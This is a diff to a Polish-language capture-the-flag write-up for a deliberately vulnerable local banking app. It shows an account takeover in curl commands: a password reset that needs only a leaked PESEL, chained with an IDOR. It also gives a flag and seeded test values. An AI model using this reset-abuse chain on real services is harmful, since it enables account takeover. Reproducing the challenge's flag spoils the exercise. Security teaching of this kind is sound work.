@@ -2,10 +2,10 @@
 
 ## Metadane
 - **ID:** A06
-- **Kategoria:** OWASP A06:2021 - Insecure Design
+- **Kategoria:** OWASP A06:2025 - Insecure Design
 - **Trudność:** easy
 - **Punkty:** 100
-- **Flaga:** `PWR{insecure_password_reset}` — w profilu alice po przejęciu konta
+- **Flaga:** `PWR{insecure_password_reset}` — w odpowiedzi z resetu hasła Alice
 
 ## Opis
 Funkcja resetu hasła wymaga tylko znajomości **PESELU** użytkownika zamiast
@@ -15,7 +15,7 @@ profilu (podatność A01 — IDOR).
 Scenariusz ataku:
 1. Użyj IDOR (A01) żeby pobrać PESEL alice z jej konta
 2. Zresetuj jej hasło przez `/api/auth/forgot-password`
-3. Zaloguj się jako alice i znajdź flagę
+3. Odczytaj flagę z odpowiedzi endpointu resetu hasła
 
 ## Exploit krok po kroku
 
@@ -46,16 +46,7 @@ Zaseedowany PESEL alice: `90010112345`
 curl -X POST http://localhost:5000/api/auth/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"email":"alice@vulnbank.pl","pesel":"90010112345","new_password":"hacked123"}'
-```
-
-### Krok 4: Zaloguj się jako alice
-```bash
-TOKEN_ALICE=$(curl -s -X POST http://localhost:5000/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"alice@vulnbank.pl","password":"hacked123"}' \
-  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
-
-curl -H "Authorization: Bearer $TOKEN_ALICE" http://localhost:5000/api/profile/
+# W odpowiedzi znajdziesz: "flag": "PWR{insecure_password_reset}"
 ```
 
 ## Jak to naprawić
@@ -68,5 +59,5 @@ curl -H "Authorization: Bearer $TOKEN_ALICE" http://localhost:5000/api/profile/
 ```
 
 ## Referencje
-- [OWASP A04:2021 - Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
+- OWASP A06:2025 - Insecure Design
 - [CWE-640: Weak Password Recovery Mechanism](https://cwe.mitre.org/data/definitions/640.html)
